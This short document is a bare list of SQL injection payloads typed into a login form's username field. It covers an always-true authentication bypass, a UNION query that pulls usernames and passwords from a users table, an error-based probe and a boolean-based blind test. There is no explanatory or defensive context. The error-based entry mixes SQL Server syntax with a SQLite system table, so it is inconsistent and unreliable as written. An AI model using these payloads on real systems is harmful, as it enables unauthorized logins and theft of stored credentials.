Authentication Bypass:
Username: ' OR '1'='1
Password: anything

Union-Based Attack:
Username: ' UNION SELECT null, username, password FROM users --
Password: anything

Error-Based Injection:
Username: ' AND 1=CONVERT(int, (SELECT name FROM sqlite_master WHERE type='table')) --
Password: anything

Blind SQL Injection (Boolean-Based):
Username: ' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1' --
Password: anything
